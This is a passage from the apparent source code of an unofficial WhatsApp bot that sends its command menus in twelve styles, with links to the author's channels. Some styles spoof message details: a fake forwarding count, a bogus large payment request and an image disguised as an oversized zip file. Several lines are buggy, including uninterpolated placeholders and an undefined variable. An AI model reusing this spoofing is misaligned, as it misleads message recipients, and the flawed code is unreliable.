      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'c9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
caption: kmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'c10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'c11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'c12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
'{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT MENU",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes",
"id":"${prefix}tout_menu"}]
}]
}'
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu_recherche': {
let kmenu_oh = 'Hey ${pushname}${readmore}\n\n${nsfwmenu(prefix, hituet)}'
if (typemenu === 'c1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c2') {
                    Kev.sendMessage(m.chat, {
                        text: kmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'c3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'c6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'c7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'c8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'c9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
caption: kmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'c10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'c11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'c12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
'{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT MENU",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes",
"id":"${prefix}tout_menu"}]
}]
}'
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'menu_ai': {
let kmenu_oh = 'Hey ${pushname}${readmore}\n\n${nsfwmenu(prefix, hituet)}'
if (typemenu === 'c1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c2') {
                    Kev.sendMessage(m.chat, {
                        text: kmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'c3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'c6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'c7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'c8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'c9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
caption: kmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'c10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'c11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: kmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": '{"display_text":"tout_menu 🗂️","id":"${prefix}toutmenu"}'
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Kev.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'c12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: kmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
'{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"TOUT MENU",
"title":"cliquez pour afficher",
"description":"Afficher toutes les commandes",
"id":"${prefix}tout_menu"}]
}]
}'
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@Kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/+1e2AuejQBkxmNDg8\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/kenvofc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VadduTqGufIpvG44NP18\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Proprio 👤","id":"${prefix}proprio"}'
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": '{"display_text":"Script 📃","id":"${prefix}script"}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'liste_menu': {
let kmenu_oh = 'Hey ${pushname}${readmore}\n\n${nsfwmenu(prefix, hituet)}'
if (typemenu === 'c1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c2') {
                    Kev.sendMessage(m.chat, {
                        text: kmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KenvFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'c3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KenvFile/theme/Sylvers.mp4'),
                        caption: kmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'c5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'c6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
